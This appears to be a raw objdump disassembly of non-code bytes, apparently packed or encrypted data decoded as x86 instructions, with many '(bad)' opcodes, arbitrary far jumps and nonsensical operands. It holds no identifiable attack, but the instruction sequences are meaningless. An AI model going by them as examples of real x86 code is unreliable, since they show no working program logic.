  420aec:	ror    DWORD PTR [esi+0x1f],0x90
  420af0:	iret   
  420af1:	pop    esp
  420af2:	xor    BYTE PTR ds:0x32b70a13,ah
  420af8:	inc    ebx
  420af9:	mov    dh,0x65
  420afb:	(bad)  
  420afc:	in     eax,0x7a
  420afe:	cmp    BYTE PTR [edi+eax*4],bh
  420b01:	test   ch,bh
  420b03:	mov    ecx,0x59740ac5
  420b08:	cmp    al,BYTE PTR [edx+0x591a9169]
  420b0e:	and    al,0x4
  420b10:	int    0x7d
  420b12:	mov    ebp,DWORD PTR [edx-0x48]
  420b15:	pop    eax
  420b16:	leave  
  420b17:	jl     0x420b8f
  420b19:	bound  edx,QWORD PTR ds:[esi-0x717a0a9c]
  420b20:	cmp    bh,BYTE PTR [ecx+0x30d58f07]
  420b26:	push   edi
  420b27:	out    dx,eax
  420b28:	inc    edi
  420b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b2a:	out    0xf2,eax
  420b2c:	ja     0x420ae6
  420b2e:	pop    ecx
  420b2f:	adc    ah,al
  420b31:	cmp    eax,0x2d3a2981
  420b36:	add    eax,0x6af8bcfc
  420b3b:	jge    0x420ac3
  420b3d:	jmp    0x32ea:0xcd36dfa0
  420b44:	daa    
  420b45:	test   al,0x3
  420b47:	fsub   DWORD PTR [esi+edi*1+0x26]
  420b4b:	pushf  
  420b4c:	pop    esi
  420b4d:	gs je  0x420bb5
  420b50:	adc    BYTE PTR [edx],dl
  420b52:	adc    al,0xc5
  420b54:	and    al,0xc3
  420b56:	(bad)  
  420b57:	jecxz  0x420bcf
  420b59:	loopne 0x420b1e
  420b5b:	bound  esp,QWORD PTR ds:0xe360ce61
  420b61:	ds into 
  420b63:	paddsw mm4,QWORD PTR [esi+0x41cfd81a]
  420b6a:	jecxz  0x420bd3
  420b6c:	fimul  DWORD PTR [eax+0x21a6a9e4]
  420b72:	or     dl,BYTE PTR [ecx+0xc]
  420b75:	repnz dec esp
  420b77:	mov    eax,0x136ba31a
  420b7c:	pop    es
  420b7d:	pavgb  mm7,QWORD PTR [ecx+0x1e]
  420b81:	jb     0x420b4e
  420b83:	mov    ds:0x71712318,al
  420b88:	fdivr  st,st(1)
  420b8a:	lds    ebp,FWORD PTR [eax-0xa]
  420b8d:	or     edx,esi
  420b8f:	loope  0x420bc1
  420b91:	mov    WORD PTR [edx-0x6e],ss
  420b94:	out    dx,eax
  420b95:	xchg   esi,eax
  420b96:	jnp    0x420bd4
  420b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b99:	xlat   BYTE PTR ds:[ebx]
  420b9a:	jnp    0x420b91
  420b9c:	addr16 std 
  420b9e:	and    eax,0x56110da5
  420ba3:	test   ebp,eax
  420ba5:	leave  
  420ba6:	adc    DWORD PTR [ecx-0x69],eax
  420ba9:	rcr    DWORD PTR [ecx-0x52],0x5a
  420bad:	xor    DWORD PTR [edi+0x13],esi
  420bb0:	and    eax,0x1d96ca01
	...
  420c15:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c1b:	mov    edi,0x65553fba
  420c20:	pop    edx
  420c21:	stc    
  420c22:	les    edi,FWORD PTR [esi-0x3]
  420c25:	hlt    
  420c26:	lods   al,BYTE PTR ds:[esi]
  420c27:	pop    ebx
  420c28:	add    DWORD PTR [eax],eax
  420c2a:	pop    es
  420c2b:	add    DWORD PTR [eax],eax
  420c2d:	add    BYTE PTR [edi+0x3a879662],cl
  420c33:	leave  
  420c34:	aam    0x29
  420c36:	pusha  
  420c37:	xchg   edx,eax
  420c38:	lods   al,BYTE PTR ds:[esi]
  420c39:	cmp    al,0x71
  420c3b:	cmp    al,0xec
  420c3d:	enter  0xb31b,0xcf
  420c41:	pop    edi
  420c42:	and    eax,0xa3dc21d0
  420c47:	add    bh,BYTE PTR [ebp+0x25]
  420c4a:	aad    0xb2
  420c4c:	pop    ecx
  420c4d:	sar    BYTE PTR [edi+eax*4-0x2743a002],cl
  420c54:	stos   BYTE PTR es:[edi],al
  420c55:	arpl   sp,bx
  420c57:	mov    edx,0x1e38aed8
  420c5c:	clc    
  420c5d:	push   0xffffffc7
  420c5f:	stos   DWORD PTR es:[edi],eax
  420c60:	stos   BYTE PTR es:[edi],al
  420c61:	scas   eax,DWORD PTR es:[edi]
  420c62:	gs inc ebp
  420c64:	mov    esi,0x87a2a393
  420c69:	add    dl,bl
  420c6b:	sub    cl,BYTE PTR [eax]
  420c6d:	add    ebx,edi
  420c6f:	stc    
  420c70:	out    0x3c,al
  420c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c73:	fist   DWORD PTR [ebp+0x3f]
  420c76:	mov    bh,0x7a
  420c78:	inc    BYTE PTR [ebx+0x412f58aa]
  420c7e:	xor    DWORD PTR [ebx-0x4f061626],esp
  420c84:	adc    ch,ah
  420c86:	push   ss
  420c87:	stos   DWORD PTR es:[edi],eax
  420c88:	push   ebp
  420c89:	scas   al,BYTE PTR es:[edi]
  420c8a:	fcomp  QWORD PTR [ecx+0x2647c131]
  420c90:	test   al,0xc2
  420c92:	mov    dl,0xdf
  420c94:	repz mov ebp,esp
  420c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c98:	cs mov esi,esi
  420c9b:	lods   eax,DWORD PTR ds:[esi]
  420c9c:	test   edi,edx
  420c9e:	mov    dh,0x5c
  420ca0:	fcom   QWORD PTR [esi]
  420ca2:	pushf  
  420ca3:	cmp    eax,DWORD PTR [edx+eiz*4+0x5be7cbbd]
  420caa:	xchg   BYTE PTR [edi+eax*2],bl
  420cad:	repz cmp DWORD PTR [edx-0xf],ebx
  420cb1:	pop    ss
  420cb2:	sub    ah,BYTE PTR [esp+ecx*2+0x62bb3a93]
  420cb9:	push   ds
  420cba:	inc    ecx
  420cbb:	mov    esp,0x31a7e712
  420cc0:	sti    
  420cc1:	inc    esp
  420cc2:	add    eax,0x7d1e2c2c
  420cc7:	das    
  420cc8:	lahf   
  420cc9:	sbb    eax,0x461c4130
  420cce:	or     eax,0x896ff641
  420cd3:	and    DWORD PTR [edi+0x3f3310e9],ebx
  420cd9:	sti    
  420cda:	(bad)  
  420cdb:	pop    ds
  420cdc:	retf   
  420cdd:	adc    bl,BYTE PTR ds:0x7c84f3cc
  420ce3:	sbb    DWORD PTR [edx+0x47],0xe534592c
  420cea:	clc    
  420ceb:	xchg   edi,eax
  420cec:	pop    ds
  420ced:	iret   
  420cee:	lea    ebx,[ecx-0x26dc8851]
  420cf4:	dec    eax
  420cf5:	cmp    eax,0x63bf09b6
  420cfa:	xor    al,0x67
  420cfc:	ss jge 0x420ccd
  420cff:	repnz cli 
  420d01:	(bad)  
  420d02:	push   0xffffffb1
  420d04:	outs   dx,DWORD PTR cs:[esi]
  420d06:	jp     0x420d05
  420d08:	dec    eax
  420d09:	(bad)  
  420d0a:	adc    esp,DWORD PTR [ebx+0x6e1e8fe]
  420d10:	fmul   QWORD PTR [esi+edi*4]
  420d13:	scas   eax,DWORD PTR es:[edi]
  420d14:	jae    0x19210b2d
  420d1a:	call   0x4a7c0110
  420d1f:	fdivrp st(0),st
  420d21:	xor    BYTE PTR [ebx-0x76],ch
  420d24:	inc    edi
  420d25:	out    dx,eax
  420d26:	je     0x420cf0
  420d28:	into   
  420d29:	sbb    DWORD PTR [ebx],esp
  420d2b:	cmp    al,0x1
  420d2d:	dec    ebp
  420d2e:	lea    ecx,[ebp+0x6523d9e5]
  420d34:	push   0x0
	...
  420d96:	out    0x1e,eax
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0x30c1cea
  420da3:	cdq    
  420da4:	jmp    0x420dd3
  420da6:	mov    bl,0x5c
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    BYTE PTR [ecx+0x1f],dl
  420db0:	push   0x210dc58e
  420db5:	add    eax,0xe1e5b313
  420dba:	pop    esp
  420dbb:	fcomp  DWORD PTR [eax-0x6225fb9e]
  420dc1:	call   0xff80ec0a
  420dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dc7:	xor    esi,DWORD PTR [eax]
  420dc9:	xchg   esi,eax
  420dca:	loopne 0x420e3a
  420dcc:	bound  edi,QWORD PTR [edx-0x51e0dfe7]
  420dd2:	or     al,BYTE PTR [edx-0x64dbbc7f]
  420dd8:	jne    0x420e0a
  420dda:	cld    
  420ddb:	outs   dx,DWORD PTR ds:[esi]
  420ddc:	dec    ebp
  420ddd:	and    eax,0xd9e6c746
  420de2:	pushw  ss
  420de4:	pop    es
  420de5:	or     al,0x1f
  420de7:	lea    esi,[esi+0x2a]
  420dea:	push   esp
  420deb:	out    0x45,eax
  420ded:	clc    
  420dee:	sub    edi,DWORD PTR [edi]
  420df0:	mov    bh,al
  420df2:	je     0x420ded
  420df4:	retf   
  420df5:	dec    esp
  420df6:	leave  
  420df7:	sbb    eax,0x457d2a14
  420dfc:	ins    BYTE PTR es:[edi],dx
  420dfd:	nop
  420dfe:	cmp    esi,DWORD PTR [edi+0x2]
  420e01:	ds out 0x11,al
  420e04:	adc    al,0x7d
  420e06:	sar    BYTE PTR [ecx+edx*8+0x28],0xa
  420e0b:	sti    
  420e0c:	scas   eax,DWORD PTR es:[edi]
  420e0d:	mov    ebx,0xfa797d54
  420e12:	out    0x3e,eax
  420e14:	push   0xffffff98
  420e16:	aas    
  420e17:	mov    BYTE PTR [edx-0x3263f55],bh
  420e1d:	aad    0xed
  420e1f:	arpl   WORD PTR [ebx],di
  420e21:	test   al,0x9c
  420e23:	or     DWORD PTR [ebp-0x6c],edx
  420e26:	sbb    BYTE PTR [edi+0x56],cl
  420e29:	sbb    eax,0xd081574f
  420e2e:	pop    ds
  420e2f:	add    DWORD PTR [edi+0x18],0x1c689439
  420e36:	cld    
  420e37:	mov    dh,0xa5
  420e39:	sub    cl,BYTE PTR [ebp+edi*2-0x7fe70d00]
  420e40:	shl    DWORD PTR [edx+0x7d],cl
  420e43:	outs   dx,BYTE PTR ds:[esi]
  420e44:	fcom   QWORD PTR [ecx]
  420e46:	adc    esi,DWORD PTR [edx-0x63]
  420e49:	and    BYTE PTR [ebx+0x1e22214a],cl
  420e4f:	cmp    ebp,edi
  420e51:	lds    ecx,FWORD PTR [edx+0xc]
  420e54:	scas   al,BYTE PTR es:[edi]
  420e55:	pop    esi
  420e56:	popa   
  420e57:	in     eax,dx
  420e58:	sub    ebp,eax
  420e5a:	dec    ecx
  420e5b:	pushf  
  420e5c:	bnd jmp 0xdb93dab6
  420e62:	out    dx,al
  420e63:	push   cs
  420e64:	inc    edx
  420e65:	imul   ecx,DWORD PTR [esi-0x31],0x59853910
  420e6c:	pop    ds
  420e6d:	push   ss
  420e6e:	or     DWORD PTR [ecx+0x7a],esp
  420e71:	bound  ebx,QWORD PTR [ebx-0x51]
  420e74:	jmp    0xb7f00690
  420e79:	cmovp  esi,DWORD PTR [esi+eax*4]
  420e7d:	cld    
  420e7e:	push   ss
  420e7f:	js     0x420e8e
  420e81:	ss daa 
  420e83:	aaa    
  420e84:	adc    dh,bh
  420e86:	mov    ch,0xaa
  420e88:	push   ss
  420e89:	lock jp 0x420e45
  420e8c:	sub    eax,0xdd56c91
  420e91:	cmc    
  420e92:	das    
  420e93:	adc    eax,0xfe223940
  420e98:	mov    BYTE PTR [esi],ch
  420e9a:	ins    DWORD PTR es:[edi],dx
  420e9b:	ds dec ecx
  420e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e9e:	ror    BYTE PTR [edx-0x12d7ce09],0xfa
  420ea5:	fwait
  420ea6:	mov    al,0x78
  420ea8:	mov    ebp,0xaa3a6f3d
  420ead:	(bad)  
  420eae:	mov    edx,0x7a8badd8
  420eb3:	loope  0x420ed8
	...
  420f15:	add    BYTE PTR [eax],ah
  420f17:	xchg   edi,eax
  420f18:	inc    edx
  420f19:	shl    edi,cl
  420f1b:	xlat   BYTE PTR ds:[ebx]
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	ds xor eax,0xba70ac81
  420f27:	pop    ebp
  420f28:	add    DWORD PTR [eax],eax
  420f2a:	pop    es
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    BYTE PTR [edx],bl
  420f2f:	push   esi
  420f30:	push   0x53ff1976
  420f35:	ss add eax,0xaf8ce38a
  420f3b:	out    0xdb,al
  420f3d:	sbb    eax,0x293f00f0
  420f42:	pop    es
  420f43:	push   0xffffffb3
  420f45:	dec    ecx
  420f46:	xchg   ebp,eax
  420f47:	dec    ecx
  420f48:	(bad)  
  420f49:	mov    eax,0x87a01396
  420f4e:	mov    ?,WORD PTR [edi]
  420f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f51:	jl     0x420efe
  420f53:	ret    0xe7e4
  420f56:	xchg   ch,bh
  420f58:	ret    
  420f59:	xchg   esp,eax
  420f5a:	inc    esp
  420f5b:	lods   al,BYTE PTR ds:[esi]
  420f5c:	cmp    dh,BYTE PTR [ebp+0x623c7eac]
  420f62:	or     eax,0x7734fe75
  420f67:	push   0xffffffa7
  420f69:	cmc    
  420f6a:	test   eax,0x3916bfda
  420f6f:	jae    0x420f31
  420f71:	pop    ss
  420f72:	fdivrp st(0),st
  420f74:	ds das 
  420f76:	mov    esp,0xdf3f56bf
  420f7b:	mov    eax,ds:0x7db04e07
  420f80:	fdivr  DWORD PTR [edx*1-0x80cee8c]
  420f87:	xchg   edi,eax
  420f88:	adc    DWORD PTR [edi],esp
  420f8a:	ins    BYTE PTR es:[edi],dx
  420f8b:	aas    
  420f8c:	rcr    DWORD PTR [eax-0x77d23c11],0xd
  420f93:	out    0xbf,al
  420f95:	xor    eax,0xed87b6d5
  420f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f9b:	ror    DWORD PTR [edi+0x6b],0x58
  420f9f:	cwde   
  420fa0:	fstp   TBYTE PTR [ecx-0xc6a470f]
  420fa6:	(bad)  
  420fa7:	pushf  
  420fa8:	dec    esi
  420fa9:	and    dl,BYTE PTR ds:0x2b85f8e6
  420faf:	push   edx
  420fb0:	ret    0xc7e8
  420fb3:	mov    ch,0x60
  420fb5:	push   esp
  420fb6:	jnp    0x420f4c
  420fb8:	sbb    DWORD PTR [ebx],edx
  420fba:	pop    ebp
  420fbb:	xlat   BYTE PTR ds:[ebx]
  420fbc:	mov    ds:0xf6d85764,eax
  420fc1:	adc    DWORD PTR [edx],ebp
  420fc3:	push   ds
  420fc4:	rol    BYTE PTR [ecx-0xc],1
  420fc7:	push   eax
  420fc8:	ins    DWORD PTR es:[edi],dx
  420fc9:	dec    edx
  420fca:	push   es
  420fcb:	sti    
  420fcc:	push   ecx
  420fcd:	into   
  420fce:	ins    DWORD PTR es:[edi],dx
  420fcf:	das    
  420fd0:	pop    ebx
  420fd1:	sub    DWORD PTR [ecx],ecx
  420fd3:	dec    ecx
  420fd4:	xchg   esp,eax
  420fd5:	sbb    ebx,eax
  420fd7:	clc    
  420fd8:	js     0x420f93
  420fda:	mov    ch,0xc9
  420fdc:	test   eax,0x86470979
  420fe1:	vpshufbitqmb k1{z},zmm0,DWORD PTR [ecx-0xfc]{1to16}
  420fe8:	adc    eax,0x9fd2d4b0
  420fee:	inc    ebx
  420fef:	mov    ecx,0xcfef2c49
  420ff4:	(bad)  
  420ff5:	rcl    DWORD PTR [ecx+0x6b],1
  420ff8:	in     al,dx
  420ff9:	std    
  420ffa:	fistp  WORD PTR [esi+0x3a]
  420ffd:	and    al,0xfc
  420fff:	cmp    BYTE PTR [edi+0x1216f611],bl
  421005:	mov    ebx,0x24fe1a11
  42100a:	fisubr WORD PTR [esi]
  42100c:	sbb    dl,ch
  42100e:	add    ecx,DWORD PTR ds:0x47733639
  421014:	int3   
  421015:	jns    0x421073
  421017:	cmp    BYTE PTR [ecx],cl
  421019:	sbb    BYTE PTR [esi+0x53],bh
  42101c:	jb     0x42107c
  42101e:	retf   0x91b
  421021:	sub    al,0x93
  421023:	dec    ebp
  421024:	fmul   QWORD PTR [ebx]
  421026:	call   0x2c66:0x266e363b
  42102d:	aaa    
  42102e:	dec    eax
  42102f:	push   ds
  421030:	cld    
  421031:	cmp    BYTE PTR [ebp+0x7b3c],0x0
	...
  421094:	add    BYTE PTR [eax],al
  421096:	lahf   
  421097:	pop    esi
  421098:	fcmovb st,st(6)
  42109a:	fcmovnb st,st(6)
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0x1f90d7fe
  4210a5:	mov    ds:0x15ec1,eax
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [eax],bl
  4210af:	mov    al,ds:0x65d94f99
  4210b4:	fist   DWORD PTR ds:0xcf36a1e
  4210ba:	out    0x3d,eax
  4210bc:	mov    bh,0x8f
  4210be:	bound  edx,QWORD PTR [edx-0x3]
  4210c1:	mov    edx,0xbbffa087
  4210c6:	mov    edi,0x9de9f43f
  4210cb:	jecxz  0x4210ab
  4210cd:	xchg   esp,eax
  4210ce:	(bad)  
  4210d0:	sbb    DWORD PTR [esi-0x1204d0c7],ebx
  4210d6:	pusha  
  4210d7:	add    al,0xd2
  4210d9:	dec    edx
  4210da:	shr    DWORD PTR [esi-0x77],cl
  4210dd:	jecxz  0x421128
  4210df:	cmp    eax,0x1147ad34
  4210e4:	sbb    al,0x31
  4210e6:	add    BYTE PTR [edx],dh
  4210e8:	test   eax,0x9f4d322a
  4210ed:	add    eax,DWORD PTR [edi+esi*8-0x29ad9ede]
  4210f4:	(bad)  
  4210f5:	mov    ecx,0xa9c26ce4
  4210fa:	scas   eax,DWORD PTR es:[edi]
  4210fb:	adc    dl,cl
  4210fd:	aad    0x9c
  4210ff:	xchg   ebp,eax
  421100:	sbb    ch,ah
  421102:	xchg   esp,eax
  421103:	popf   
  421104:	cmp    eax,0xf104eeed
  421109:	cmc    
  42110a:	imul   esi,DWORD PTR [ebx],0xa2e7db57
  421110:	stc    
  421111:	mov    BYTE PTR [esi-0x2b],dl
  421114:	sbb    eax,0xd6090f94
  421119:	imul   eax,DWORD PTR [edx+0xd2a9dc1],0xacf60a0d
  421123:	adc    BYTE PTR [ebp+0x66da4ac],dl
  421129:	jb     0x421195
  42112b:	outs   dx,BYTE PTR ds:[esi]
  42112c:	mov    esp,0xc1b2ed80
  421131:	dec    edi
  421132:	sbb    ebp,ecx
  421134:	jp     0x421146
  421136:	and    cl,cl
  421138:	mov    ds,WORD PTR [ecx+0x23]
  42113b:	xchg   ebx,eax
  42113c:	shl    bl,cl
  42113e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42113f:	addr16 dec eax
  421141:	sbb    al,0xb9
  421143:	jmp    0x8e34:0x35a7dc2a
  42114a:	fist   DWORD PTR ds:0x1802
  42114f:	popa   
  421150:	adc    BYTE PTR [ebx-0x71cb1b59],dh
  421156:	cwde   
  421157:	mov    dh,0x2d
  421159:	inc    esi
  42115a:	ret    
  42115b:	hlt    
  42115c:	xor    dl,BYTE PTR [esi+0x4681054e]
  421162:	rcr    esi,cl
  421164:	test   BYTE PTR [ecx+0x6b],0xad
  421168:	add    bl,BYTE PTR [ebp-0x5944e33b]
  42116e:	lock rcl BYTE PTR [esi-0x4e897b6e],1
  421175:	push   edi
  421176:	rcl    BYTE PTR [esi-0x3a],cl
  421179:	ds ja  0x4211c1
  42117c:	pop    es
  42117d:	enter  0xaf33,0xa6
  421181:	inc    eax
  421182:	lock sub bl,ah
  421185:	out    0xcb,al
  421187:	add    al,0xee
  421189:	hlt    
  42118a:	int3   
  42118b:	je     0x421148
  42118d:	push   ss
  42118e:	test   DWORD PTR [esi+0x74224db6],ecx
  421194:	sbb    al,0x46
  421196:	js     0x421168
  421198:	xchg   esp,eax
  421199:	sub    al,0xef
  42119b:	fs sub eax,0x67e7fe2c
  4211a1:	out    0x14,eax
  4211a3:	repz mov eax,DWORD PTR [ebp+0x42b695d8]
  4211aa:	xor    DWORD PTR [ebp+eax*2-0x648b1af7],ecx
  4211b1:	mov    DWORD PTR [ebp+edx*1+0x4],esp
	...
  421214:	add    BYTE PTR [eax],al
  421216:	sahf   
  421217:	pop    ds
  421218:	(bad)  
  421219:	test   DWORD PTR [edi+0x617ffef7],0x6f492007
  421223:	or     BYTE PTR [eax+0x15fc8fc],ah
  421229:	add    BYTE PTR [edi],al
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    BYTE PTR [edi+eiz*2-0x600a13f6],dh
  421234:	cld    
  421235:	loop   0x4211ca
  421237:	(bad)  
  421238:	sbb    edi,esi
  42123a:	mov    cl,0xa0
  42123c:	xchg   BYTE PTR [edx],bh
  42123e:	jo     0x4212ae
  421240:	pusha  
  421241:	repnz call 0x60d4:0x2a5ee36a
  421249:	jmp    0xbc57:0x424186e
  421250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421251:	xor    dh,BYTE PTR [edi]
  421253:	sbb    BYTE PTR [ebp+ecx*1-0x2b089f7d],ch
  42125a:	repz test DWORD PTR [ecx+ebx*1+0x49],ebx
  42125f:	and    al,0xdb
  421261:	out    dx,al
  421262:	enter  0xf7fa,0x9d
  421266:	mov    ecx,DWORD PTR [ecx]
  421268:	or     ecx,DWORD PTR [edi+0x2b43ad6a]
  42126e:	push   ecx
  42126f:	or     al,0xe9
  421271:	adc    ch,BYTE PTR [esi+ebx*4]
  421274:	inc    edi
  421275:	data16 (bad) 
  421277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421278:	inc    ebx
  421279:	mov    ebp,0xc1e5c21f
  42127e:	inc    edi
  42127f:	inc    edi
  421280:	push   edi
  421281:	inc    ecx
  421282:	cpuid  
  421284:	push   edx
  421285:	mov    ah,0xb9
  421287:	in     eax,dx
  421288:	fnstsw WORD PTR [ecx+0x29]
  42128b:	mov    dl,0x66
  42128d:	in     al,dx
  42128e:	in     al,0x17
  421290:	sbb    ebx,DWORD PTR [eax+0x10ea200e]
  421296:	dec    eax
  421297:	xchg   ebx,eax
  421298:	dec    esi
  421299:	sahf   
  42129a:	add    BYTE PTR [ecx],0xa5
  42129d:	aaa    
  42129e:	mov    ecx,0xdaf9c8dc
  4212a3:	test   ebx,0x4f477cb0
  4212a9:	mov    esp,0xf5b1c06f
  4212ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212af:	or     ebx,DWORD PTR [edi-0x707b781d]
  4212b5:	fisubr DWORD PTR [ecx-0x3c6f76c0]
  4212bb:	and    al,0x5d
  4212bd:	jmp    0x8df71ee1
  4212c2:	popa   
  4212c3:	aad    0x15
  4212c5:	jecxz  0x42125e
  4212c7:	push   edi
  4212c8:	das    
  4212c9:	(bad)  
  4212ca:	jae    0x421270
  4212cc:	jmp    0x4212b2
  4212ce:	pop    esi
  4212cf:	sub    al,0x49
  4212d1:	mov    al,ds:0x2c67ecb3
  4212d6:	and    esi,ebx
  4212d8:	xchg   ebp,eax
  4212d9:	pop    esi
  4212da:	jnp    0x421283
  4212dc:	add    eax,0xf03f6e69
  4212e1:	mov    ds:0xdcc943b9,eax
  4212e6:	add    eax,0xba2cdad3
  4212eb:	int3   
  4212ec:	cli    
  4212ed:	pop    ebx
  4212ee:	arpl   WORD PTR [eax-0xf],bp
  4212f1:	cmp    ebp,DWORD PTR [esi]
  4212f3:	pop    ss
  4212f4:	std    
  4212f5:	jae    0x421283
  4212f7:	aad    0x64
  4212f9:	or     BYTE PTR ds:0xea3bdba,ah
  4212ff:	sub    bh,ah
  421301:	inc    esi
  421302:	sub    eax,0x70d892ef
  421307:	lock pop edi
  421309:	pop    esi
  42130a:	cwde   
  42130b:	jg     0x421302
  42130d:	mov    ah,0x94
  42130f:	(bad)  
  421310:	and    ecx,DWORD PTR [eax+edi*2-0x1c8ef62d]
  421317:	xor    al,0x8b
  421319:	mov    cl,0x8d
  42131b:	cwde   
  42131c:	pavgb  mm4,mm2
  42131f:	(bad)  
  421320:	out    0x9e,eax
  421322:	in     eax,dx
  421323:	adc    al,0x3b
  421325:	push   0xfd2b4b1b
  42132a:	and    DWORD PTR [ebp-0x3b],edx
  42132d:	imul   edi,DWORD PTR ds:0x828787bf,0x4a
  421334:	clc    
	...
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0xff6c04b0
  4213a3:	cmp    al,0xcc
  4213a5:	and    ecx,edi
  4213a7:	pusha  
  4213a8:	add    DWORD PTR [eax],eax
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [ecx+ecx*1],bl
  4213b0:	sbb    eax,0x301ca776
  4213b5:	lock inc esp
  4213b7:	cli    
  4213b8:	mov    ecx,0x60e17197
  4213bd:	push   es
  4213be:	add    ebx,DWORD PTR [eax+ebp*1+0x47]
  4213c2:	dec    esp
  4213c3:	jae    0x4213d2
  4213c5:	push   es
  4213c6:	loopne 0x42143c
  4213c8:	jbe    0x421440
  4213ca:	popf   
  4213cb:	pop    ecx
  4213cc:	stc    
  4213cd:	ficomp WORD PTR [esi+0x5e24d288]
  4213d3:	loopne 0x42135d
  4213d5:	les    ebx,FWORD PTR [edi]
  4213d7:	out    dx,eax
  4213d8:	mov    dl,0x4d
  4213da:	pushf  
  4213db:	and    ebp,DWORD PTR [ebx]
  4213dd:	xchg   ebp,eax
  4213de:	mov    ebx,0x8ed4560a
  4213e3:	sbb    BYTE PTR [ebx-0x4ec3cc56],bl
  4213e9:	xchg   esp,esp
  4213eb:	cmp    DWORD PTR [ebx+0x79],eax
  4213ee:	imul   ebx,DWORD PTR [ebx+0x1d],0x63
  4213f2:	sbb    DWORD PTR [edi+0xe],eax
  4213f5:	or     eax,0x21852b45
  4213fa:	loope  0x42145b
  4213fc:	imul   eax,DWORD PTR [esi+0x6436eb64],0x8838e75b
  421406:	fcom   DWORD PTR [esi-0x1f]
  421409:	sbb    ebp,edi
  42140b:	and    ch,BYTE PTR [eax]
  42140d:	cmp    BYTE PTR [edi],ah
  42140f:	out    0x28,al
  421411:	je     0x42145c
  421413:	xor    DWORD PTR [edi],eax
  421415:	add    al,0x24
  421417:	cmp    al,0xfe
  421419:	sub    BYTE PTR [ebx],dh
  42141b:	adc    BYTE PTR [ebx+0x43],al
  42141e:	add    esi,DWORD PTR [edi-0x7f]
  421421:	mov    ds:0xdf9e60a4,al
  421426:	mov    eax,0x677b7907
  42142b:	or     bl,BYTE PTR ds:[ecx-0x5a]
  42142f:	xchg   esi,eax
  421430:	or     esp,DWORD PTR [edx+0x73]
  421433:	int    0x89
  421435:	pop    esp
  421436:	cld    
  421437:	and    bh,al
  421439:	adc    ah,BYTE PTR [ecx]
  42143b:	add    ebp,DWORD PTR [edx+0x64e7a091]
  421441:	mov    ch,0xc7
  421443:	xchg   ebx,eax
  421444:	xor    esp,DWORD PTR [edi]
  421446:	dec    esp
  421447:	push   edx
  421448:	xchg   DWORD PTR [esi-0x7d],esi
  42144b:	xchg   edx,eax
  42144c:	push   0x48f98eda
  421451:	push   ebp
  421452:	stos   DWORD PTR es:[edi],eax
  421453:	inc    edx
  421454:	pop    ss
  421455:	into   
  421456:	mov    ch,0x93
  421458:	sar    BYTE PTR [eax-0x179aa5a8],1
  42145e:	call   FWORD PTR ds:0x5ef5618c
  421464:	and    al,0x4c
  421466:	jbe    0x421406
  421468:	jae    0x42148b
  42146a:	or     eax,0x1d893166
  42146f:	retf   
  421470:	add    eax,0x25179c06
  421475:	pop    ss
  421476:	pop    eax
  421477:	sbb    BYTE PTR [eax+0x5141109b],bh
  42147d:	mov    edx,0xbf871c9f
  421482:	mov    DWORD PTR [edi],ebp
  421484:	popa   
  421485:	es pop esi
  421487:	pslld  mm1,QWORD PTR [edi-0xb]
  42148b:	fs push esp
  42148d:	mov    ds:0xad096766,eax
  421492:	lods   eax,DWORD PTR ds:[esi]
  421493:	js     0x4214f1
  421495:	and    al,0x6b
  421497:	sahf   
  421498:	push   ecx
  421499:	pop    ss
  42149a:	(bad)
  42149d:	and    dh,BYTE PTR cs:[eax+0x1ecf92cc]
  4214a4:	mov    ch,0x68
  4214a6:	add    DWORD PTR [edi+eiz*8+0x3becbee],edx
  4214ad:	retf   0x5b
  4214b0:	xor    ebx,edx
  4214b2:	add    eax,edi
  4214b4:	aad    0x0
	...
  421516:	(bad)  
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	sahf   
  421523:	aas    
  421524:	in     al,dx
  421525:	add    al,0xd6
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    cl,ch
  42152f:	test   eax,0x7fb09637
  421534:	mov    bl,0xfe
  421536:	pop    ss
  421537:	test   al,0xec
  421539:	dec    esp
  42153a:	inc    ebx
  42153b:	sub    eax,0x54ef0bf9
  421540:	(bad)  
  421541:	mov    ch,0xa9
  421543:	push   ds
  421544:	xor    BYTE PTR [ebx+eax*2+0x15],bl
  421548:	sub    edx,DWORD PTR [edx+0x76]
  42154b:	adc    al,0x75
  42154d:	int3   
  42154e:	push   esp
  42154f:	icebp  
  421550:	iret   
  421551:	push   edx
  421552:	mov    dh,bl
  421554:	retf   
  421555:	jmp    0xa138b686
  42155a:	add    al,0xf2
  42155c:	aaa    
  42155d:	inc    edx
  42155e:	mov    eax,ds:0xa34ef92d
  421563:	push   cs
